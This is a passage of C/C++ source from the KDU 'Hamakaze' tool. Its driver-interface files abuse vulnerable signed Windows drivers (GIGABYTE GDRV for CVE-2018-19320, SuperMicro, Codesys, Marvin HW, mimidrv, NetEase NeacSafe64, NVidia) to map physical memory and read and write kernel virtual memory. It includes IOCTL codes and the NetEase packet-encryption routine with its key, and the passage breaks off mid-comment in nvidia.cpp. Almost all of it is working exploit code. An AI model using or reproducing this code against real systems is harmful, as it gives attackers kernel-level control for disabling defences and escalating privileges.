    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = MapMemVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = MapMemReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* MapMemReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory via GDRV.
*
*/
BOOL WINAPI MapMemReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = MapMemVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = MapMemReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* MapMemRegisterDriver
*
* Purpose:
*
* Register MapMem driver.
*
*/
BOOL WINAPI MapMemRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);

    UNREFERENCED_PARAMETER(DeviceHandle);

    switch (DriverId) {

    case IDR_SYSDRV3S:
        g_MapMem_MapIoctl = IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY;
        g_MapMem_UnmapIoctl = IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY;
        break;

    case IDR_GDRV:
    default:
        g_MapMem_MapIoctl = IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY;
        g_MapMem_UnmapIoctl = IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY;
        break;
    }

    return TRUE;
}

```

`Source/Hamakaze/idrv/mapmem.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       MAPMEM.H
*
*  VERSION:     1.26
*
*  DATE:        15 Oct 2022
*
*  MAPMEM driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// GIGABYTE GDRV driver interface for CVE-2018-19320.
//

#define GDRV_DEVICE_TYPE        (DWORD)0xC350

#define GDRV_VIRTUALTOPHYSICAL  (DWORD)0xA03
#define GRV_IOCTL_INDEX         (DWORD)0x800 

#define IOCTL_GDRV_VIRTUALTOPHYSICAL            \
    CTL_CODE(GDRV_DEVICE_TYPE, GDRV_VIRTUALTOPHYSICAL, METHOD_BUFFERED, FILE_ANY_ACCESS) //0xC350280C

#define IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY     \
    CTL_CODE(GDRV_DEVICE_TYPE, GRV_IOCTL_INDEX+1, METHOD_BUFFERED, FILE_ANY_ACCESS) //0xC3502004

#define IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY   \
    CTL_CODE(GDRV_DEVICE_TYPE, GRV_IOCTL_INDEX+2, METHOD_BUFFERED, FILE_ANY_ACCESS) //0xC3502008

//
// SuperMicro SUPERBMC driver interface.
//

#define SUPERBMC_DEVICE_TYPE  (DWORD)0x8010

#define SUPERBMC_MAP_FUNCID   (DWORD)0x88E
#define SUPERBMC_UNMAP_FUNCID (DWORD)0x890

#define IOCTL_SUPERBMC_MAP_USER_PHYSICAL_MEMORY      \
    CTL_CODE(SUPERBMC_DEVICE_TYPE, SUPERBMC_MAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102238

#define IOCTL_SUPERBMC_UNMAP_USER_PHYSICAL_MEMORY    \
    CTL_CODE(SUPERBMC_DEVICE_TYPE, SUPERBMC_UNMAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102240

//
// Codesys driver interface (basically copy-paste from mapmem ddk).
//

#define FILE_DEVICE_MAPMEM            (DWORD)0x00008000
#define MAPMEM_IOCTL_INDEX            (DWORD)0x800

#define IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY   CTL_CODE(FILE_DEVICE_MAPMEM , \
                                                         MAPMEM_IOCTL_INDEX,  \
                                                         METHOD_BUFFERED,     \
                                                         FILE_ANY_ACCESS)

#define IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY CTL_CODE(FILE_DEVICE_MAPMEM,  \
                                                         MAPMEM_IOCTL_INDEX+1,\
                                                         METHOD_BUFFERED,     \
                                                         FILE_ANY_ACCESS)

typedef struct _GIO_VIRTUAL_TO_PHYSICAL {
    ULARGE_INTEGER Address;
} GIO_VIRTUAL_TO_PHYSICAL, * PGIO_VIRTUAL_TO_PHYSICAL;

typedef struct _MAPMEM_PHYSICAL_MEMORY_INFO {
    INTERFACE_TYPE   InterfaceType; 
    ULONG            BusNumber;     
    PHYSICAL_ADDRESS BusAddress;
    ULONG            AddressSpace;  
    ULONG            Length;        
} MAPMEM_PHYSICAL_MEMORY_INFO, * PMAPMEM_PHYSICAL_MEMORY_INFO;

BOOL WINAPI MapMemVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI MapMemReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG BufferLength);

BOOL WINAPI MapMemWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI MapMemWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI MapMemReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI MapMemQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI MapMemRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

```

`Source/Hamakaze/idrv/marvinhw.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       MARVINHW.CPP
*
*  VERSION:     1.25
*
*  DATE:        18 Aug 2022
*
*  Marvin HW driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/marvinhw.h"


/*
* HwMapMemory
*
* Purpose:
*
* Map physical memory.
*
*/
PVOID HwMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    HWMEMORYDESC request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.PhysicalAddress.QuadPart = PhysicalAddress;
    request.Length = NumberOfBytes;

    if (supCallDriver(DeviceHandle,
        IOCTL_HWMEM_MAP,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        return request.VirtualAddress;
    }

    return NULL;
}

/*
* HwUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID HwUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap
)
{
    HWMEMORYDESC request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.VirtualAddress = SectionToUnmap;

    supCallDriver(DeviceHandle,
        IOCTL_HWMEM_UNMAP,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* HwQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI HwQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    DWORD cbRead = 0x100000;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)HwMapMemory(DeviceHandle,
        0ULL,
        cbRead);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        HwUnmapMemory(DeviceHandle,
            (PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* HwReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI HwReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = HwMapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes);

    if (mappedSection) {

        __try {

            if (DoWrite) {
                RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        HwUnmapMemory(DeviceHandle,
            mappedSection);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* HwReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI HwReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return HwReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* HwWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI HwWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return HwReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* HwVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI HwVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        HwQueryPML4Value,
        HwReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* HwWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory via HW64.
*
*/
BOOL WINAPI HwWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = HwVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = HwReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* HwReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory via HW64.
*
*/
BOOL WINAPI HwReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = HwVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = HwReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

```

`Source/Hamakaze/idrv/marvinhw.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       MARVINHW.H
*
*  VERSION:     1.25
*
*  DATE:        18 Aug 2022
*
*  Marvin HW driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Marvin HW driver interface.
//

#define	FILE_DEVICE_MARVIN_HW   (DWORD)0x9C40

#define HWMEM_MAP               (DWORD)0x940
#define HWMEM_UNMAP             (DWORD)0x941

#define IOCTL_HWMEM_MAP     \
    CTL_CODE(FILE_DEVICE_MARVIN_HW, HWMEM_MAP,\
             METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_HWMEM_UNMAP   \
    CTL_CODE(FILE_DEVICE_MARVIN_HW, HWMEM_UNMAP,\
             METHOD_BUFFERED, FILE_READ_ACCESS)

typedef struct tagHWMEMORYDESC {
    PHYSICAL_ADDRESS PhysicalAddress;
    ULONG_PTR Length;
    PVOID VirtualAddress;
} HWMEMORYDESC, * PHWMEMORYDESC;

BOOL WINAPI HwQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI HwVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI HwReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI HwWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI HwWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI HwReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);


```

`Source/Hamakaze/idrv/mimidrv.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       MIMIDRV.CPP
*
*  VERSION:     1.20
*
*  DATE:        08 Feb 2022
*
*  Mimikatz "mimidrv" driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/mimidrv.h"

/*
* MimidrvReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via mimidrv.
*
*/
BOOL WINAPI MimidrvReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supCallDriver(DeviceHandle,
        IOCTL_MIMIDRV_VM_READ,
        (PVOID)VirtualAddress,
        0,
        Buffer,
        NumberOfBytes);
}

/*
* MimidrvWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via mimidrv.
*
*/
BOOL WINAPI MimidrvWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supCallDriver(DeviceHandle,
        IOCTL_MIMIDRV_VM_WRITE,
        Buffer,
        NumberOfBytes,
        (PVOID)VirtualAddress,
        0);
}

```

`Source/Hamakaze/idrv/mimidrv.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       MIMIDRV.H
*
*  VERSION:     1.20
*
*  DATE:        08 Feb 2022
*
*  MIMIDRV driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Mimikatz mimidrv interface
//

#define MIMIDRV_FUNC_VMREAD  (DWORD)0x60
#define MIMIDRV_FUNC_VMWRITE (DWORD)0x61

#define IOCTL_MIMIDRV_VM_READ               \
    CTL_CODE(FILE_DEVICE_UNKNOWN, MIMIDRV_FUNC_VMREAD, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA) //0x0022C183

#define IOCTL_MIMIDRV_VM_WRITE	            \
    CTL_CODE(FILE_DEVICE_UNKNOWN, MIMIDRV_FUNC_VMWRITE, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA) //0x0022C187

BOOL WINAPI MimidrvReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI MimidrvWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/netease.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       NETEASE.CPP
*
*  VERSION:     1.44
*
*  DATE:        10 Jul 2025
*
*  NetEase drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/netease.h"

//
// Based on https://github.com/smallzhong/NeacController
// 

BYTE g_Key[33] = "FuckKeenFuckKeenFuckKeenFuckKeen";
unsigned char g_NetEaseSafe_EncImm[] =
{
    0x7A, 0x54, 0xE5, 0x41, 0x8B, 0xDB, 0xB0, 0x55, 0x7A, 0xBD,
    0x01, 0xBD, 0x1A, 0x7F, 0x9E, 0x17
};

SUP_SETUP_DRVPKG g_NetEasePackage;

#define NEACSAFE64INF_FILE TEXT("NeacSafe64.inf")

// as is, copied from NeacSafe64 driver.
void NetEaseEncyptBuffer(unsigned int* buffer, unsigned int idx)
{
    __m128i v2;
    unsigned int* result; 
    int v4; 
    __m128i v5;
    __m128i v8;

    __m128i imm = _mm_load_si128((__m128i*)g_NetEaseSafe_EncImm);
    __m128i zero;
    memset(&zero, 0, sizeof(__m128i));
    v2 = _mm_cvtsi32_si128(idx);
    result = &v8.m128i_u32[3];
    v8 = _mm_xor_si128(
        _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_unpacklo_epi8(v2, v2), 0), 0),
        imm);
    v4 = 0;
    v5 = _mm_cvtsi32_si128(0x4070E1Fu);
    do
    {
        __m128i v6 = _mm_shufflelo_epi16(_mm_unpacklo_epi8(_mm_or_si128(_mm_cvtsi32_si128(*result), v5), zero), 27);
        v6 = _mm_packus_epi16(v6, v6);
        *buffer = (*buffer ^ ~idx) ^ v6.m128i_u32[0] ^ idx;
        ++buffer;
        result = (unsigned int*)((char*)result - 1);
        v4++;
    } while (v4 < 4);
    return;
}

void NetEaseSafeEncodePayload(PBYTE key, PBYTE buffer, SIZE_T size) 
{
    for (int i = 0; i < size; i++) {
        buffer[i] ^= key[i & 31];
    }
    unsigned int* ptr = (unsigned int*)buffer;
    unsigned int v12 = 0;
    do
    {
        NetEaseEncyptBuffer(ptr, v12++);
        ptr += 4;
    } while (v12 < size >> 4);
}

HANDLE NetEaseConnectDriver(
    _In_ KDU_CONTEXT* Context
) 
{
    HANDLE hPort;
    HRESULT hResult;
    NEAC_FILTER_CONNECT lpContext;
    WCHAR szPortName[MAX_PATH + 1];

    lpContext.Magic = 0x4655434B;
    lpContext.Version = 8;

    RtlCopyMemory(lpContext.EncKey, g_Key, 32);

    StringCchPrintf(szPortName, RTL_NUMBER_OF(szPortName), 
        TEXT("\\%ws"),
        Context->Provider->LoadData->DeviceName);
    
    hResult = FilterConnectCommunicationPort(szPortName,
        FLT_PORT_FLAG_SYNC_HANDLE,
        &lpContext,
        40,
        NULL,
        &hPort
    );
    if (hResult != S_OK || hPort == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    return hPort;
}

/*
* NetEaseStartVulnerableDriver
*
* Purpose:
*
* Start vulnerable driver callback.
* Install NetEase fs filter driver.
* 
*/
BOOL NetEaseStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL          bLoaded = FALSE;
    PKDU_DB_ENTRY provLoadData = Context->Provider->LoadData;
    LPWSTR        lpPortName = provLoadData->PortName;

    RtlSecureZeroMemory(&g_NetEasePackage, sizeof(SUP_SETUP_DRVPKG));

    g_NetEasePackage.InfFile = NEACSAFE64INF_FILE;
    g_NetEasePackage.InfFileResourceId = IDR_DATA_NEACSAFEINF;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\", lpPortName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        if (supSetupManageFsFilterDriverPackage(Context, TRUE, &g_NetEasePackage)) {

            WCHAR szBuffer[MAX_PATH + 1];
            UNICODE_STRING driverServiceName;

            //
            // Load as usual.
            //
            if (SUCCEEDED(StringCchPrintf(szBuffer, MAX_PATH,
                DRIVER_REGKEY,
                NT_REG_PREP,
                provLoadData->DriverName)))
            {

                RtlInitUnicodeString(&driverServiceName, szBuffer);
                NTSTATUS status = NtLoadDriver(&driverServiceName);
                bLoaded = NT_SUCCESS(status);
                if (!bLoaded) {
                    supShowHardError("[!] Unable to load vulnerable driver", status);
                }
            }

        }
    }

    //
    // If driver loaded then open handle for it port.
    // This is simplified version of KDUProvOpenVulnerableDriverAndRunCallbacks as the target does need all this functionality.
    //
    if (bLoaded) {
        HANDLE portHandle = NetEaseConnectDriver(Context);
        if (portHandle == NULL) {
            supShowWin32Error("[!] Unable to open vulnerable driver port handle", GetLastError());
        }
        else {
            supPrintfEvent(kduEventInformation,
                "[+] Driver port \"%ws\" has been opened successfully\r\n",
                Context->Provider->LoadData->PortName);
            Context->PortHandle = portHandle;
        }

    }
    else {
        supShowWin32Error("[!] Vulnerable driver is not loaded", GetLastError());
    }

    return (Context->PortHandle != NULL);
}

/*
* NetEaseStopVulnerableDriver
*
* Purpose:
*
* Stop vulnerable driver callback.
* Uninstall NetEase driver and remove files.
*
*/
VOID NetEaseStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    PKDU_DB_ENTRY provLoadData = Context->Provider->LoadData;
    WCHAR szBuffer[MAX_PATH + 1];
    UNICODE_STRING driverServiceName;

    //
    // Load as usual.
    //
    if (SUCCEEDED(StringCchPrintf(szBuffer, MAX_PATH,
        DRIVER_REGKEY,
        NT_REG_PREP,
        provLoadData->DriverName)))
    {

        RtlInitUnicodeString(&driverServiceName, szBuffer);
        NTSTATUS status = NtUnloadDriver(&driverServiceName);
        if (!NT_SUCCESS(status)) {
            supShowHardError("[!] Unable to unload vulnerable driver", status);
        }
        else {
            printf_s("[+] Vulnerable driver unloaded\r\n");
        }

        supSetupManageFsFilterDriverPackage(Context, FALSE, &g_NetEasePackage);
    }
}

/*
* NetEaseReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via NetEase driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NetEaseReadVirtualMemory(
    _In_ HANDLE PortHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    DWORD bytesReturned;
    BYTE packetBuffer[16];
    NEAC_READ_PACKET* ptr = (NEAC_READ_PACKET*)packetBuffer;

    ptr->Opcode = OpCode_ReadVM;
    ptr->Src = (PVOID)VirtualAddress;
    ptr->Size = NumberOfBytes;

    NetEaseSafeEncodePayload(g_Key, packetBuffer, sizeof(packetBuffer));
    return SUCCEEDED(FilterSendMessage(PortHandle, packetBuffer, sizeof(packetBuffer), Buffer, NumberOfBytes, &bytesReturned));
}

/*
* NetEaseWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via NetEase driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NetEaseWriteVirtualMemory(
    _In_ HANDLE PortHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    DWORD bytesReturned;
    BYTE buffer[32];
    NEAC_WRITE_PACKET* ptr = (NEAC_WRITE_PACKET*)buffer;

    ptr->Opcode = OpCode_WriteVM;
    ptr->Dst = (PVOID)VirtualAddress;
    ptr->Src = Buffer;
    ptr->Size = NumberOfBytes;
    
    NetEaseSafeEncodePayload(g_Key, buffer, sizeof(buffer));
    return SUCCEEDED(FilterSendMessage(PortHandle, buffer, sizeof(buffer), NULL, NULL, &bytesReturned));
}

```

`Source/Hamakaze/idrv/netease.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       NETEASE.H
*
*  VERSION:     1.44
*
*  DATE:        10 Jul 2025
*
*  NetEase drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Based on https://github.com/smallzhong/NeacController
// 

#define OpCode_ReadVM 14
#define OpCode_WriteVM 70

#pragma pack(1)
typedef struct _NEAC_READ_PACKET {
    BYTE Opcode;
    PVOID Src;
    DWORD Size;
} NEAC_READ_PACKET, *PNEAC_READ_PACKET;
#pragma pack()

#pragma pack(1)
typedef struct _NEAC_WRITE_PACKET {
    BYTE Opcode;
    PVOID Dst;
    PVOID Src;
    DWORD Size;
} NEAC_WRITE_PACKET, *PNEAC_WRITE_PACKET;
#pragma pack()

#pragma pack(1)
typedef struct _NEAC_FILTER_CONNECT {
    DWORD Magic;
    DWORD Version;
    BYTE EncKey[32];
} NEAC_FILTER_CONNECT, *PNEAC_FILTER_CONNECT;
#pragma pack()

BOOL NetEaseStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

VOID NetEaseStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

_Success_(return != FALSE)
BOOL WINAPI NetEaseReadVirtualMemory(
    _In_ HANDLE PortHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI NetEaseWriteVirtualMemory(
    _In_ HANDLE PortHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/nvidia.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       NVIDIA.CPP
*
*  VERSION:     1.34
*
*  DATE:        16 Sep 2023
*
*  NVidia drivers routines.
* 
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/nvidia.h"

#ifdef __cplusplus
extern "C" {
#include "../Shared/thirdparty/whirlpool/whirlpool.h"
}
#endif

//
// Nvo based on https://github.com/zer0condition/NVDrv
//

VOID whirlpool(
    _In_ PVOID pcData,
    _In_ ULONG cbData, 
    _Inout_ PVOID result)
{
    NESSIEstruct structpointer;

    NESSIEinit(&structpointer);
    NESSIEadd((const PUCHAR)pcData, 8 * cbData, &structpointer);
    NESSIEfinalize(&structpointer, (PUCHAR)result);
}

/*
* NvoEncryptRequest
*
* Purpose:
*
* Encrypts request for driver side verification.
* Exact code ripped from driver.
*
